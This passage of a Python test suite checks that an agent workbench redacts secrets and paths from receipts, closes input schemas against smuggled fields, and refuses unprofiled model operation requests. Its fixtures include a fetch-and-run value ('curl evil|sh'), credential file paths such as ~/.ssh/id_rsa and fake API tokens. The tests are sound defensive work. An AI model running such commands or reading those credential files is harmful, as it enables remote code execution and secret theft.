    # refuses to construct at all -- there is no free-text field for a secret to
    # arrive in.
    for bad_value in ("api_key=abc def", "Bearer sk-abcdefgh 12", "https://evil.internal/x?tok=1", "user@host secret"):
        with pytest.raises(RunContextError):
            OperationReceipt(
                new_receipt_id(), "cmd_x", "run_1", operation, "succeeded",
                "run:run_1:evidence:1", now, now, external_ref={"state_event_id": bad_value},
            )

    # (b) LAST-HOP SCRUB: each of these IS pattern-valid (only [A-Za-z0-9._:/-]),
    # so the bounded pattern alone would let it through. It is instead collapsed
    # to the opaque "redacted" token in the persisted receipt AND the
    # reconciliation record -- the exact corpus the adversarial gate proved leaks.
    proven_leaks = (
        "/home/deploy/.ssh/id_rsa",
        "C:/Users/x/.aws/credentials",
        "/etc/anvil/secrets.env",
        "sk-proj-AbC123def456xyz789",
        "sk_live_AbC123def456xyz789",
        "ghp-AbC123def456xyz789",
        "eyJhbGciOi.eyJzdWIiOiIx.abcDEF123",
    )
    for leak in proven_leaks:
        receipt = OperationReceipt(
            new_receipt_id(), "cmd_x", "run_1", operation, "succeeded",
            "run:run_1:evidence:1", now, now, external_ref={"state_event_id": leak},
        )
        assert receipt.external_ref["state_event_id"] == "redacted"
        assert leak not in json.dumps(receipt.as_dict()), f"receipt leaked {leak!r}"

        item = ReconciliationItem(
            new_reconciliation_id(), "run_1", "cmd_x", operation, "interrupted",
            "k1", "an interrupted merge", external_ref={"state_event_id": leak},
        )
        assert item.external_ref["state_event_id"] == "redacted"
        assert leak not in json.dumps(item.as_dict()), f"reconciliation leaked {leak!r}"

    # (c) A legitimate opaque token (owner/repo, gh:1, a state-event id) is NOT
    # collapsed: the scrub targets credential/endpoint/path shapes only, so the
    # fix does not break a real external reference (correctness's explicit ruling
    # against a blunt '/' ban).
    for good in ("gh:1", "evt_1", "owner/repo"):
        receipt = OperationReceipt(
            new_receipt_id(), "cmd_x", "run_1", operation, "succeeded",
            "run:run_1:evidence:1", now, now, external_ref={"pr": good},
        )
        assert receipt.external_ref["pr"] == good


def test_open_operation_input_schema_is_refused_and_a_smuggled_field_cannot_validate():
    # T006 closure: check_operation_schema proved well-formedness/dialect/local
    # refs but NOT additionalProperties:false, so an open input object let a model
    # smuggle an undeclared field into ResolvedOperation.inputs. Operation INPUT
    # schemas must now be CLOSED (outputs stay deliberately open); an open one is
    # refused at the catalog-load boundary that feeds both resolve_operation and
    # the bridge preflight, and the smuggled field cannot validate through a
    # closed schema.
    from workbench.contracts import (
        ContractValidationError, check_operation_input_schema, check_operation_schema, contract_digest,
    )
    from workbench.provider_catalogs import ProviderCatalogError, validate_provider_catalog
    from jsonschema import Draft202012Validator
    from jsonschema.exceptions import ValidationError

    # Otherwise-valid inputs plus one undeclared field, so the ONLY thing that can
    # reject it is the object closure -- not a missing required field or a bad
    # task_ref shape.
    smuggled = {
        "task_ref": "release-beta:T001",
        "verification_receipt_ids": ["rcpt_v"],
        "__smuggled_raw_command": "curl evil|sh",
    }

    catalog = json.loads(
        (_REPO_ROOT / "docs" / "contracts" / "examples" / "anvil-state.catalog.v1.json").read_text("utf-8")
    )
    target = next(op for op in catalog["operations"] if op["id"] == "state.evidence.submit")
    closed_schema = json.loads(json.dumps(target["input_schema"]))

    # The shipped input schema is already closed: the input-closure check accepts
    # it (so no shipped example digest must change) and the smuggled field is
    # rejected by validation.
    check_operation_input_schema(closed_schema)
    with pytest.raises(ValidationError):
        Draft202012Validator(closed_schema).validate(smuggled)

    # Reopen just this operation's input object and rehash, so the digest check
    # passes and the closure check is the guard that fires.
    target["input_schema"].pop("additionalProperties")
    for op in catalog["operations"]:
        op["operation_digest"] = contract_digest("operation", op)
    catalog["catalog_digest"] = contract_digest("catalog", catalog)

    # An OPEN input object validates the smuggle -- exactly the hole -- but
    # validate_provider_catalog now refuses to publish it, so it never reaches a
    # snapshot, resolve_operation, or the preflight.
    Draft202012Validator(target["input_schema"]).validate(smuggled)
    with pytest.raises(ProviderCatalogError, match="additionalProperties:false"):
        validate_provider_catalog("anvil-state", catalog)

    # The distinction is INPUT-only: check_operation_schema (the output path)
    # still accepts the same open object, so provider outputs stay open, while
    # check_operation_input_schema refuses it.
    check_operation_schema(target["input_schema"])
    with pytest.raises(ContractValidationError, match="additionalProperties:false"):
        check_operation_input_schema(target["input_schema"])


def test_operation_receipt_validator_trust_root_fails_closed(monkeypatch, tmp_path):
    # The receipt contract loader is the single interpretation of the receipt
    # schema; its fail-closed guards (absent schema -> OSError, a reopened root or
    # sub-object, a dropped error-summary credential guard) must each be exercised
    # so a future edit deleting one cannot pass silently. Mirrors the sibling
    # loader trust-root tests (test_plan_task_delivery, test_advanced_contracts,
    # test_capability_profiles). Resets the module cache in try/finally so a
    # drifted validator never cascades into an unrelated test.
    from workbench import contracts as contracts_module

    schemas = _REPO_ROOT / "docs" / "contracts" / "schemas"
    base = json.loads((schemas / "operation-receipt.v1.schema.json").read_text("utf-8"))

    def _write(mutate) -> Path:
        drifted = json.loads(json.dumps(base))
        mutate(drifted)
        path = tmp_path / f"drifted-{mutate.__name__}.schema.json"
        path.write_text(json.dumps(drifted), encoding="utf-8")
        contracts_module._reset_operation_receipt_contract_validator_cache()
        monkeypatch.setattr(contracts_module, "_OPERATION_RECEIPT_CONTRACT_SCHEMA_PATH", path)
        return path

    contracts_module._reset_operation_receipt_contract_validator_cache()
    try:
        # (1) Absent schema file: the OSError is caught and re-raised closed.
        monkeypatch.setattr(
            contracts_module, "_OPERATION_RECEIPT_CONTRACT_SCHEMA_PATH", tmp_path / "absent.schema.json"
        )
        with pytest.raises(contracts_module.ContractValidationError, match="schema is unavailable"):
            contracts_module.operation_receipt_contract_validator()

        # (2) Reopened ROOT object.
        def reopen_root(s):
            s["additionalProperties"] = True
        _write(reopen_root)
        with pytest.raises(contracts_module.ContractValidationError, match="no longer closes its root object"):
            contracts_module.operation_receipt_contract_validator()

        # (3) Reopened a closed SUB-object (the error block).
        def reopen_error(s):
            s["properties"]["error"].pop("additionalProperties")
        _write(reopen_error)
        with pytest.raises(contracts_module.ContractValidationError, match="no longer closes its error object"):
            contracts_module.operation_receipt_contract_validator()

        # (4) Dropped the error-summary credential-class token guard.
        def drop_summary_guard(s):
            s["properties"]["error"]["properties"]["safe_summary"].pop("not")
        _write(drop_summary_guard)
        with pytest.raises(contracts_module.ContractValidationError, match="guards its error summary"):
            contracts_module.operation_receipt_contract_validator()
    finally:
        contracts_module._reset_operation_receipt_contract_validator_cache()


def test_persisted_operation_receipt_exposes_only_its_closed_field_set():
    from workbench.contracts import validate_operation_receipt
    from workbench.models import OperationRef, OperationRefusal
    from workbench.store import MemoryOperationReceiptStore, OperationOutcome

    store = MemoryOperationReceiptStore()
    operation = OperationRef("anvil-state", "state.evidence.submit", "1.0.0", "sha256:" + "4" * 64)
    denied, _ = store.record_attempt(
        run_id="run_1", command_id="cmd_1", operation=operation, idempotency_key="k1",
        task_ref="release-beta:T001",
        executor=lambda: OperationOutcome(
            "denied",
            error=OperationRefusal(
                "approval.invalid", "grant reached via https://evil.internal/tok secret", retryable=False,
            ),
        ),
    )
    # Closed-set: no field outside the declared receipt shape (leak-by-addition).
    assert set(denied) - _RECEIPT_ALLOWED_FIELDS == set()
    assert denied["redaction"]["status"] == "metadata_only"
    # The persisted receipt is schema valid and carries no seeded leak.
    validate_operation_receipt(denied)
    blob = json.dumps(denied)
    assert "evil.internal" not in blob
    assert "secret" not in blob


def test_reconciliation_record_scrubs_a_seeded_secret_and_path_summary():
    from workbench.store import MemoryOperationReceiptStore, UnknownOutcomeError
    from workbench.models import OperationRef

    store = MemoryOperationReceiptStore()
    operation = OperationRef("project-bridge", "bridge.github.merge_and_accept", "1.0.0", "sha256:" + "0" * 64)

    def interrupted():
        raise UnknownOutcomeError(
            r"merge unknown; token at C:\creds\gh.pem via https://api.github.example/x",
            external_ref={"pr": "gh:1"}, reason="interrupted",
        )

    store.record_attempt(
        run_id="run_1", command_id="cmd_1", operation=operation, idempotency_key="k1", executor=interrupted,
    )
    item = store.list_reconciliations()[0]
    assert "[REDACTED-PATH]" in item["safe_summary"]
    assert "[REDACTED-URL]" in item["safe_summary"]
    assert "gh.pem" not in json.dumps(item)
    assert "api.github.example" not in json.dumps(item)


def test_a_model_operation_request_cannot_select_an_unprofiled_capability():
    # Defence-in-depth security assertion: a model naming an operation that is in
    # the discovered catalog but absent from the run's pinned capability profile
    # is refused for that exact reason, never resolved into a dispatch.
    from _support import compile_delivery_snapshot, operation_ref_for, published_catalog_set
    from workbench.models import TypedOperationError
    from workbench.workflows import resolve_operation_request

    proposal = {
        "schema_version": "workbench-model-proposal/v1",
        "kind": "operation_request",
        "reason": "Attempt to read the project snapshot outside the profile.",
        "operation": operation_ref_for("state.project.snapshot"),
        "input": {},
    }
    with pytest.raises(TypedOperationError) as excinfo:
        resolve_operation_request(proposal, compile_delivery_snapshot(), published_catalog_set())
    assert excinfo.value.code == "operation.unprofiled"


# ---------------------------------------------------------------------------
# Preference configuration security lens (preferences-configuration:
# T004.1 / T002.2)
# ---------------------------------------------------------------------------


def _pref_catalog_doc() -> dict:
    path = _REPO_ROOT / "docs" / "contracts" / "examples" / "settings-descriptor.v1.json"
    return json.loads(path.read_text(encoding="utf-8"))


def test_secret_and_deployment_only_values_cannot_enter_a_policy_operation():
    # T004.1 criterion 4 (security lens): a secret/path-like or deployment-only
    # value is authority-owned and can never be carried in an operation payload.
    from workbench.models import PolicyOperationError, build_policy_operation

    catalog = _pref_catalog_doc()
    by_id = {s["id"]: s for s in catalog["settings"]}
    for setting_id in ("deployment.identity_header_name", "deployment.state_read_location"):
        with pytest.raises(PolicyOperationError):
            build_policy_operation(
                by_id[setting_id], operation="preference.set", op_version=1, value="whatever",
            )


def test_preference_free_text_value_serializations_scrub_the_proven_leak_corpus():
    # Security lens: a free-text preference value or operation payload that
    # reaches a serialized/persisted record must be scrubbed with the hardened
    # config-class scrubber, so no secret/endpoint/path can ride out. A revert to
    # the transcript-only scrub (or dropping the as_dict scrub) fails this test.
    from workbench.models import (
        PolicyOperation,
        PolicyOperationPreview,
        PreferenceRecord,
    )

    poison = _corpus_field("note")

    record = PreferenceRecord(
        setting_id="personal.custom_label", scope="personal", scope_key="alice",
        value=poison, write_version=1, updated_by="alice",
    )
    operation = PolicyOperation("preference.set", "personal.custom_label", "personal", 1, poison)
    preview = PolicyOperationPreview(operation, poison)

    blobs = [
        json.dumps(record.as_dict()),
        json.dumps(operation.as_dict()),
        json.dumps(preview.as_dict()),
    ]
    for label, literal in _RUN_CONTEXT_LEAK_CORPUS.items():
        for blob in blobs:
            assert literal not in blob, f"a preference serialization leaked a {label!r} value"
    for fragment in ("AKIAIOSFODNN7", "eyJhbGci", "BEGIN RSA PRIVATE KEY", "100.64.0.5", "db.internal", "state.db"):
        for blob in blobs:
            assert fragment not in blob, f"a preference serialization leaked fragment {fragment!r}"
    # The audit metadata never carries the value at all (no leak surface).
    assert poison not in json.dumps(record.audit_metadata())


def test_preference_store_cross_scope_reads_are_byte_identical():
    # T002.2 security lens: a cross-actor and a cross-project read return the
    # exact same not-found bytes a genuinely missing record returns, so neither
    # is a cross-scope existence oracle.
    from workbench.store import MemoryPreferenceStore, UnknownPreferenceError

    store = MemoryPreferenceStore(_pref_catalog_doc())
    store.set_preference("personal", "alice", "personal.time_format", "format_12h", 0, "alice")
    store.set_preference("project", "proj_1", "project.delivery_route", "route.delivery-heavy", 0, "alice")

    def _raw(fn) -> bytes:
        try:
            fn()
        except UnknownPreferenceError as exc:
            return repr(exc.args).encode("utf-8")
        raise AssertionError("expected UnknownPreferenceError")

    foreign_actor = _raw(lambda: store.get("personal", "mallory", "personal.time_format"))
    foreign_project = _raw(lambda: store.get("project", "proj_9", "project.delivery_route"))
    missing = _raw(lambda: store.get("personal", "nobody", "personal.landing_surface"))
    assert foreign_actor == foreign_project == missing
